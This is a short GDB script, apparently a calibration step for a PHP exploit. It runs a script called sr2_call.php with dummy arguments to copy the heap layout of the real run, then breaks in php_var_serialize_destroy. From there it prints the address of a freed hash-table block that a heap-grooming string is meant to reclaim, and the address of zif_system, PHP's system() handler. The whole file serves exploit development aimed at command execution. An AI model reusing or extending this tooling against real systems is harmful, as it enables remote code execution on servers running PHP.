set pagination off
set confirm off
set auto-load safe-path /

# Discovery/calibration for sr2_call.php: run with 16-digit DUMMY decimals
# (identical argv string lengths to the real run -> identical ZendMM layout),
# stop at the OUTER php_var_serialize_destroy entry (before any walk/dtor),
# read the old-arData block address the groom string will reclaim + zif_system.
break php_var_serialize_destroy
run -n sr2_call.php 0000000000000000 0000000000000000
set $d  = d
set $ht = &$d->ht
set $base = (char *)((char *)$ht->arData + 4*(int)$ht->nTableMask)
printf "DISC BASE=%p ZIF=%p D=%p\n", $base, zif_system, $d
kill
quit
